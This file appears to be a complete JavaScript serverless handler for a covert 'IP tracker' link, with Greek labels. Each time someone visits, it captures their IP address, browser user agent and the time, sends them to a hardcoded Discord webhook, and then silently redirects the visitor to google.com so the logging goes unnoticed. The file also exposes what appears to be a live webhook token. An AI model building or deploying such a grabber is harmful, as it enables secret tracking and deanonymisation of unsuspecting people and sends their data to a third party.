export default async function handler(req, res) {
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1555940802025234563/QnWSzmCWIYlFVLLPBZ5L2d2WWMuLs0miPpxSGW94W8Qwdgc6fhc9ZPk6iwClscrKx_NE";
    const REDIRECT_URL = "https://google.com";

    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Άγνωστη IP";
    if (typeof ip === 'string' && ip.includes(',')) {
        ip = ip.split(',')[0].trim();
    }
    
    const userAgent = req.headers['user-agent'] || "Άγνωστος Browser";
    const date = new Date().toLocaleString("el-GR", { timeZone: "Europe/Athens" });

    const message = {
        embeds: [{
            title: "🚨 Νέα Καταγραφή IP! 🚨",
            color: 15158332,
            fields: [
                { name: "🌐 IP Διεύθυνση", value: `\`\`\`${ip}\`\`\``, inline: false },
                { name: "🗓️ Ημερομηνία & Ώρα", value: date, inline: true },
                { name: "📱 Πληροφορίες Συσκευής", value: `\`${userAgent}\``, inline: false }
            ],
            footer: { text: "Custom IP Tracker" }
        }]
    };

    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });
    } catch (error) {
        console.error(error);
    }

    res.writeHead(302, { Location: REDIRECT_URL });
    res.end();
}

